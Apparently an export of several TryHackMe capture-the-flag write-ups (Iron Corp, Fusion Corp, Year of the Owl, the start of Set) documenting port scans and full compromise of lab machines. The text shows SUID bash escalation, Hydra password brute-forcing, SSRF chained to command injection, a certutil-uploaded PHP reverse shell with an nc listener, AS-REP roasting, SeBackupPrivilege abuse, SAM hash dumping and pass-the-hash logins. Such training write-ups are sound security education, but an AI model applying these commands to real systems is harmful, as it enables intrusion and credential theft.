2 git git 4096 Sep 6 2020 logdrwxr-xr-x 6 git git 4096 Sep 5 2020 queuesdrwx------ 7 git git 4096 Mar 23 05:31 sessionsbash-5.0# chmod u+s bashchmod u+s bashbash-5.0# ls -alls -altotal 2312drwxr-xr-x 9 git git 4096 Mar 23 06:34 .drwxr-xr-x 5 root root 4096 Sep 5 2020 ..drwxr-xr-x 2 git git 4096 Sep 5 2020 attachmentsdrwxr-xr-x 2 git git 4096 Sep 5 2020 avatars-rwsr-xr-x 1 root root 1113504 Mar 23 06:34 bashdrwxr-xr-x 2 git git 4096 Sep 5 2020 conf-rw-r--r-- 1 git git 1212416 Mar 23 05:57 gitea.dbdrwxr-xr-x 4 git git 4096 Sep 5 2020 indexersdrwxr-xr-x 2 git git 4096 Sep 6 2020 logdrwxr-xr-x 6 git git 4096 Sep 5 2020 queuesdrwx------ 7 git git 4096 Mar 23 05:31 sessionsbash-5.0# ```{: .nolineno}Lets use this bash to get effective SUID root permission .![Untitled](Untitled%2019.png)```bashbash-4.4# cd /rootbash-4.4# ls -altotal 28drwx------ 4 root root 4096 Sep 6 2020 .drwxr-xr-x 23 root root 4096 May 31 2021 ..lrwxrwxrwx 1 root root 9 Sep 3 2020 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 2 root root 4096 Sep 3 2020 .cachedrwx------ 3 root root 4096 Sep 3 2020 .gnupglrwxrwxrwx 1 root root 9 Sep 6 2020 .mysql_history -> /dev/null-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-r-------- 1 root root 38 Sep 5 2020 root.txtbash-4.4# cat root.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}bash-4.4# ```{: .nolineno}I am root Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Iron Corp", "url": "/posts/Iron-Corp/", "categories": "TryHackMe", "tags": "SSRF, Windows, PrivEsc, Command Injection", "date": "2024-03-21 00:00:00 +0530", "snippet": "| Machine Link | [https://tryhackme.com/r/room/ironcorp](https://tryhackme.com/r/room/ironcorp) || ------------------ | -----------------------------------------------------------------------...", "content": "| Machine Link | [https://tryhackme.com/r/room/ironcorp](https://tryhackme.com/r/room/ironcorp) || ------------------ | ------------------------------------------------------------------------------ || Operating System | Windows || Difficulty | Hard || Machine Created by | [MrSeth6797](https://tryhackme.com/p/MrSeth6797) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Iron_corp]â””â”€$ nmap -sC -sV -T4 -p- -oN Nmap_Results.txt -Pn 10.10.130.211Nmap scan report for ironcorp.me (10.10.130.211)Host is up (0.22s latency).Not shown: 65528 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus135/tcp open msrpc Microsoft Windows RPC3389/tcp open ms-wbt-server Microsoft Terminal Services|_ssl-date: 2024-03-21T03:55:35+00:00; 0s from scanner time.| rdp-ntlm-info: | Target_Name: WIN-8VMBKF3G815| NetBIOS_Domain_Name: WIN-8VMBKF3G815| NetBIOS_Computer_Name: WIN-8VMBKF3G815| DNS_Domain_Name: WIN-8VMBKF3G815| DNS_Computer_Name: WIN-8VMBKF3G815| Product_Version: 10.0.14393|_ System_Time: 2024-03-21T03:55:27+00:00| ssl-cert: Subject: commonName=WIN-8VMBKF3G815| Not valid before: 2024-03-20T03:46:08|_Not valid after: 2024-09-19T03:46:088080/tcp open http Microsoft IIS httpd 10.0|_http-open-proxy: Proxy might be redirecting requests|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE11025/tcp open http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)|_http-title: Coming Soon - Start Bootstrap Theme|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4| http-methods: |_ Potentially risky methods: TRACE49666/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windows```{: .nolineno}## Web Enumeration â¤µï¸I checked port 8080 and got this interesting static site ðŸ”½![Image](Pasted%20image%2020240321092156.png)_Dashboard Page_Looked into some subdomains through feroxbuster Tool.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Iron_corp]â””â”€$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \"Host: FUZZ.ironcorp.me\" -u http://ironcorp.me:11025/ -fs 2739 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/' v2.1.0-dev________________________________________________ :: Method : GET :: URL : http://ironcorp.me:11025/ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.ironcorp.me :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 2739________________________________________________admin [Status: 401, Size: 1305, Words: 145, Lines: 48, Duration: 347ms]internal [Status: 403, Size: 1086, Words: 103, Lines: 43, Duration: 376ms][WARN] Caught keyboard interrupt (Ctrl-C)```{: .nolineno}Lets access internal.ironcorp.me subdomain â¬![Image](Pasted%20image%2020240321103505.png)_internal.ironcorp.me:11025 403 Error_Now lets access another subdomain â¬![Image](Pasted%20image%2020240321100645.png)_admin.ironcorp.me:11025 Page_Lets brute-force the Username and password with Hydra Tool ðŸ”½```bashhydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt admin.ironcorp.me -s 11025 http-head -I```{: .nolineno}![Image](Pasted%20image%2020240321101317.png)_Hydra Tool_After Login I get this page ðŸ”»![Image](Pasted%20image%2020240321101407.png)_Search query_### SSRF Vulnerability â¬I looked for SSRF vulnerability and it is indeed SSRF I verified it like this ðŸ”½![Image](Pasted%20image%2020240321101750.png)_SSRF response that can access local server file_So lets access the 403 Error subdomain with this may be I could able to open it through this â¬![Image](Pasted%20image%2020240321103710.png)_SSRF vulnerability and opened the subdomain page in it_On click here I got this redirected page : ![Image](Pasted%20image%2020240321103934.png)_Username Equinox_When I try to search any thing through name parameter I get appended to the Name like this ðŸ”½![Image](Pasted%20image%2020240321134319.png)So I tried to use separator as (|) in between of commands like this ðŸ”½![Image](Pasted%20image%2020240321105216.png)_Command Injection_Lets use our Burpsuite Tool that will intercept the request and I can modify its queries easy also , So I decided to upload `php_reverse_shell.php` file with certutil Tool in this system . ![Image](Pasted%20image%2020240321113025.png)_Certutil Tool worked successfully_Lets get the reverse shell now ðŸ”½```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Iron_corp]â””â”€$ rlwrap nc -lvnp 445listening on [any] 445 ...connect to [10.11.75.200] from (UNKNOWN) [10.10.64.247] 49711SOCKET: Shell has connected! PID: 6076Microsoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved.E:\\xampp\\htdocs\\internal>whoamint authority\\systemE:\\xampp\\htdocs\\internal>cd C:\\Users\\AdministratorE:\\xampp\\htdocs\\internal>C:C:\\Users\\Administrator>tree /f /aFolder PATH listingVolume serial number is 000000FB 7805:3F28C:.+---Contacts+---Desktop| user.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\user.txtthm{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}C:\\Users\\Administrator>```{: .nolineno}Lets look for root.txt as I was enumerating I was resticted to enter into some directories like Admin, SuperAdmin directories so I suspected that the root.txt file must be inside these directories so I checked there permissions ðŸ”»```powershellC:\\Users>icacls C:\\Users\\SuperAdminC:\\Users\\SuperAdmin BUILTIN\\Administrators:(OI)(CI)(N) S-1-5-21-297466380-2647629429-287235700-1000:(OI)(CI)(F)Successfully processed 1 files; Failed processing 0 filesC:\\Users>```{: .nolineno}So I granted the permissions as Adminstrators user for full access ðŸ”½```powershellC:\\Users>icacls C:\\Users\\SuperAdmin /grant Administrator:fprocessed file: C:\\Users\\SuperAdminSuccessfully processed 1 files; Failed processing 0 filesC:\\Users>C:\\Users>icacls C:\\Users\\SuperAdminC:\\Users\\SuperAdmin BUILTIN\\Administrators:(OI)(CI)(N) WIN-8VMBKF3G815\\Administrator:(F) S-1-5-21-297466380-2647629429-287235700-1000:(OI)(CI)(F)Successfully processed 1 files; Failed processing 0 filesC:\\Users>```{: .nolineno}But still I can don't have access to its directories so I suspected that the `root.txt` must be in `Desktop/root.txt` so I searched for that with its permissions and I got it like this ðŸ”½```powershellPS C:\\Users> icacls C:\\Users\\SuperAdmin\\Desktop\\root.txtC:\\Users\\SuperAdmin\\Desktop\\root.txt BUILTIN\\Administrators:(F) WIN-8VMBKF3G815\\Administrator:(F) BUILTIN\\Administrators:(I)(N) S-1-5-21-297466380-2647629429-287235700-1000:(I)(F)Successfully processed 1 files; Failed processing 0 filesPS C:\\Users>```{: .nolineno}Now I can see the content as an Administrator user ðŸ”½```powershellPS C:\\Users> cat C:\\Users\\SuperAdmin\\Desktop\\root.txtthm{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}PS C:\\Users>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Fusion Corp", "url": "/posts/Fusion-Corp/", "categories": "TryHackMe", "tags": "SeBackupPrivilege, secretsdump, BloodHound, Active Directory, ASREPRoast, PrivEsc, Backup-ToSystem", "date": "2024-03-19 00:00:00 +0530", "snippet": "| Machine Link | [https://tryhackme.com/r/room/fusioncorp](https://tryhackme.com/r/room/fusioncorp) || ------------------ | -------------------------------------------------------------------...", "content": "| Machine Link | [https://tryhackme.com/r/room/fusioncorp](https://tryhackme.com/r/room/fusioncorp) || ------------------ | ---------------------------------------------------------------------------------- || Operating System | Windows (Active Directory) || Difficulty | Hard || Machine Created by | [MrSeth6797](https://tryhackme.com/p/MrSeth6797) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Fusion_corp]â””â”€$ nmap -sC -sV -T4 -p- -oN Nmap_Results.txt -Pn 10.10.111.199Nmap scan report for 10.10.111.199Host is up (0.30s latency).Not shown: 65513 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: eBusiness Bootstrap Template|_http-server-header: Microsoft-IIS/10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-19 09:10:22Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services|_ssl-date: 2024-03-19T09:11:55+00:00; -1s from scanner time.| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp| Not valid before: 2024-03-18T08:59:36|_Not valid after: 2024-09-17T08:59:36| rdp-ntlm-info: | Target_Name: FUSION| NetBIOS_Domain_Name: FUSION| NetBIOS_Computer_Name: FUSION-DC| DNS_Domain_Name: fusion.corp| DNS_Computer_Name: Fusion-DC.fusion.corp| DNS_Tree_Name: fusion.corp| Product_Version: 10.0.17763|_ System_Time: 2024-03-19T09:11:16+00:005985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf .NET Message Framing49666/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049670/tcp open msrpc Microsoft Windows RPC49677/tcp open msrpc Microsoft Windows RPC49688/tcp open msrpc Microsoft Windows RPC49700/tcp open msrpc Microsoft Windows RPCService Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-03-19T09:11:20|_ start_date: N/AService detection performed.```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and found this static page no any interesting Users found through dashboard users faces.![Image](Pasted%20image%2020240320222825.png)_Dashboard Page_I then looked for directory or files bruteforcing and I found some indexed directories through feroxbuster Tool like this ðŸ”»![Image](Pasted%20image%2020240320223659.png)_Feroxbuster Output_I looked into it and found this `employee.ods` file .![Image](Pasted%20image%2020240320095826.png)_employee.ods file_Lets check this file and I found a bunch of other files so I extracted it and opened this content.xml file that contains that usernames ðŸ”½![Image](Pasted%20image%2020240320095935.png)_content.xml file_Lets extract the usernames and save them in a file : ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Fusion_corp/employees]â””â”€$ cat content.xml | sed \"s/>\\n' | cut -d '>' -f 2 | cut -d 'GetNPUsers.py Tool.![Image](Pasted%20image%2020240320095750.png)_GetNPUsers.py Tool_I get the Ticket from this user lparker lets crack this hash value with John The Ripper Tool.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Fusion_corp/employees]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status ($krb5asrep$23$lparker@FUSION.CORP) 1g 0:00:00:10 DONE (2024-03-20 09:55)Use the \"--show\" option to display all of the cracked passwords reliablySession completed.```{: .nolineno}I got the password so lets see what privileges does this user have with netexec Tool.![Image](Pasted%20image%2020240320100146.png)_Got privileges of SMB,winrm,RDP services_### WINRM Session â¬ Lets have lparker user winrm session now â¬![Image](Pasted%20image%2020240320100528.png)_FLAG.txt file from lparker user_with Bloodhound I checked user jmurphy account and I got this information from its description ðŸ”½![Image](Pasted%20image%2020240320112049.png)_BloodHound Description_I got the password of jmurphy user so lets have it's winrm session now as we are Lateral moving so ðŸ”» ```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Fusion_corp]â””â”€$ evil-winrm -i 10.10.111.223 -u jmurphy -p '' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\jmurphy\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\jmurphy> whoamifusion\\jmurphy*Evil-WinRM* PS C:\\Users\\jmurphy> tree /f /aFolder PATH listingVolume serial number is 82D1-EB4DC:.+---Desktop| flag.txt|+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\jmurphy> cat Desktop\\flag.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}*Evil-WinRM* PS C:\\Users\\jmurphy> ```{: .nolineno}I checked the privileges and found this user is a part of Backup Operator group so I tried this Tool [Backup-ToSystem.ps1](https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Backup-ToSystem.ps1) .```powershell*Evil-WinRM* PS C:\\Users\\jmurphy> whoami /allUSER INFORMATION----------------User Name SID============== ======================================fusion\\jmurphy S-1-5-21-1898838421-3672757654-990739655-1104GROUP INFORMATION-----------------Group Name Type SID Attributes========================================== ================ ============ ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Backup Operators Alias S-1-5-32-551 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== SeMachineAccountPrivilege Add workstations to domain EnabledSeBackupPrivilege Back up files and directories EnabledSeRestorePrivilege Restore files and directories EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled.*Evil-WinRM* PS C:\\Users\\jmurphy>```{: .nolineno}I found this Tool from this [Blog](https://www.hackplayers.com/2020/06/backup-tosystem-abusando-de-los.html) post . The tool mainly checks the SeBackupPrivilege Enable and then apply changes according to the ACL permissions like to add a user or doing any task as `nt \\authority system` user. ![Image](Pasted%20image%2020240320220215.png)_winrm session as jmurpy user_I then ran the Backup-ToSystem command that allows me to execute any command ðŸ”½![Image](Pasted%20image%2020240320220347.png)![Image](Pasted%20image%2020240320220413.png)_Backup-ToSystem Command_Lets add this user in Administrators group with this command ðŸ”½![Image](Pasted%20image%2020240320220543.png)Lets check now ðŸ”»![Image](Pasted%20image%2020240320220648.png)_user information_As the user jmurphy is a part of Administrators group so lets dump the SAM with netexec Tool command like this ðŸ”½![Image](Pasted%20image%2020240320220921.png)_Netexec SMB enumeration of SAM hashes_But through jmurphy also I can dump the flag like this now ðŸ”½```powershell*Evil-WinRM* PS C:\\Users\\jmurphy\\Documents> cd ../../Administrator*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 82D1-EB4DC:.+---3D Objects+---Contacts+---Desktop| flag.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videoscat D*Evil-WinRM* PS C:\\Users\\Administrator> cat Desktop/flag.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG}*Evil-WinRM* PS C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Year Of The Owl", "url": "/posts/Year-of-the-Owl/", "categories": "TryHackMe", "tags": "SNMP, hydra, PrivEsc, Windows, secretsdump, Password Bruteforce, UDP", "date": "2024-03-18 00:00:00 +0530", "snippet": "| Machine Link | [https://tryhackme.com/r/room/yearoftheowl](https://tryhackme.com/r/room/yearoftheowl) || ------------------ | ---------------------------------------------------------------...", "content": "| Machine Link | [https://tryhackme.com/r/room/yearoftheowl](https://tryhackme.com/r/room/yearoftheowl) || ------------------ | -------------------------------------------------------------------------------------- || Operating System | Windows || Difficulty | Hard || Machine Created by | [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_owl]â””â”€$ nmap -sC -sV -T4 -p- -oN Nmap_Results.txt -Pn 10.10.129.128Nmap scan report for 10.10.129.128Host is up (0.32s latency).Not shown: 65527 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)|_http-title: Year of the Owl|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10|_http-title: 400 Bad Request| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1445/tcp open microsoft-ds?3306/tcp open mysql?| fingerprint-strings: | NULL, SMBProgNeg, TerminalServerCookie, oracle-tns: |_ Host 'ip-10-11-75-200.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server3389/tcp open ms-wbt-server Microsoft Terminal Services|_ssl-date: 2024-03-18T09:49:15+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=year-of-the-owl| Not valid before: 2024-03-17T09:41:24|_Not valid after: 2024-09-16T09:41:245985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and 443 both are the same with no directories or files in it .![Image](Pasted%20image%2020240319102042.png)_Webpage_So I looked for UDP ports that are open and found this SNMP port when no TCP ports are in help : ![Image](Pasted%20image%2020240319140421.png)_NMAP UDP SNMP port scan_I then brute-forced the snmp information as a password or you can say community name that will help me extract information from snmp service .![Image](Pasted%20image%2020240319101640.png)_SNMP service community name bruteforce_Then I ran this snmpwalk Tool command to extract the information related to usernames like this ðŸ”»```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_owl]â””â”€$ snmpwalk -c openview -v1 10.10.74.117 1.3.6.1.4.1.77.1.2.25iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: \"Guest\"iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: \"Jareth\"iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: \"Administrator\"iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: \"DefaultAccount\"iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: \"WDAGUtilityAccount\"```{: .nolineno}I then brute-forced the other open services with this Jareth as username and I used this password list to brute-force the services `/usr/share/wordlists/metasploit/unix_passwords.txt` through Hydra Tool.![Image](Pasted%20image%2020240319101147.png)_Hydra Tool_Lets check the other privileges with this credentials ðŸ”½![Image](Pasted%20image%2020240319101005.png)_netexec Tool_### WinRM Session â¤µï¸```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme]â””â”€$ evil-winrm -i 10.10.74.117 -u Jareth -p Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Jareth\\Documents> cd ..whoami*Evil-WinRM* PS C:\\Users\\Jareth> whoamiyear-of-the-owl\\jareth*Evil-WinRM* PS C:\\Users\\Jareth> tree /f /aFolder PATH listingVolume serial number is 7C0C-3814C:.+---3D Objects+---Contacts+---Desktop| user.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Jareth> type Desktop\\user.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG}*Evil-WinRM* PS C:\\Users\\Jareth> ```{: .nolineno}Due to Antivirus I was not able to run winPEAS.exe file but I uploaded .ps1 file of it from [here](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASps1/winPEAS.ps1) .![Image](Pasted%20image%2020240319113459.png)_winpeas.exe not executed due to AV_and ran it and I got this important information as it was colorless output ðŸ”½![Image](Pasted%20image%2020240319113405.png)_SAM.bak file found_I checked this directory and found these files â¬```powershell*Evil-WinRM* PS C:\\Users\\Jareth\\Documents> cd 'C:\\$Recycle.Bin\\S-1-5-21-1987495829-1628902820-919763334-1001\\'*Evil-WinRM* PS C:\\$Recycle.Bin\\S-1-5-21-1987495829-1628902820-919763334-1001> dir Directory: C:\\$Recycle.Bin\\S-1-5-21-1987495829-1628902820-919763334-1001Mode LastWriteTime Length Name---- ------------- ------ -----a---- 9/18/2020 7:28 PM 49152 sam.bak-a---- 9/18/2020 7:28 PM 17457152 system.bak*Evil-WinRM* PS C:\\$Recycle.Bin\\S-1-5-21-1987495829-1628902820-919763334-1001>```{: .nolineno}After that I copy these 2 files into attackers machine with smb shares like this â¤µï¸![Image](Pasted%20image%2020240319114308.png)_Transfer of files with SMB service_Now I have sam and system files so lets use secretsdump Tool to extract some information ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_owl]â””â”€$ python3 /opt/Tools/secretsdump.py -sam sam.bak -system system.bak LOCAL Impacket v0.11.0 - Copyright 2023 Fortra[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662f.....a7a:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17.....55a:::[*] Cleaning up... ```{: .nolineno}Lets Pass-the-Hash and get a Administrators shell ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_owl]â””â”€$ evil-winrm -i 10.10.160.67 -u Administrator -H 6bc99ede9edcfecf9662f.....a7a Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ..tree /f*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 7C0C-3814C:.+---3D Objects+---Contacts+---Desktop| admin.txt|+---Documents+---Downloads| xampp-windows-x64-7.4.10-0-VC15-installer.exe|+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator> cat Desktop\\admin.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG}*Evil-WinRM* PS C:\\Users\\Administrator> ```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Set", "url": "/posts/Set/", "categories": "TryHackMe", "tags": "Active Directory, Fuzzing, SMB, plink, Metasploit, mslink, PrivEsc", "date": "2024-03-09 00:00:00 +0530", "snippet": "| Machine Link | [Set](https://tryhackme.com/r/room/set) || ------------------ | ---------------------------------------------------------------- || Operating System ...", "content": "| Machine Link | [Set](https://tryhackme.com/r/room/set) || ------------------ | ---------------------------------------------------------------- || Operating System | Windows (Active Directory) || Difficulty | Hard || Machine Created by | [4ndr34z](https://tryhackme.com/p/4ndr34z) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Set]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.125.98 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 13:35 ISTNmap scan report for 10.10.125.98Host is up (0.33s latency).Not shown: 65530 filtered tcp ports (no-response)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| tls-alpn: |_ http/1.1|_http-server-header: Microsoft-HTTPAPI/2.0|_ssl-date: 2024-03-09T08:14:10+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=set.windcorp.thm| Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm| Not valid before: 2020-06-07T15:00:22|_Not valid after: 2036-10-07T15:10:21445/tcp open microsoft-ds?5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49667/tcp open msrpc 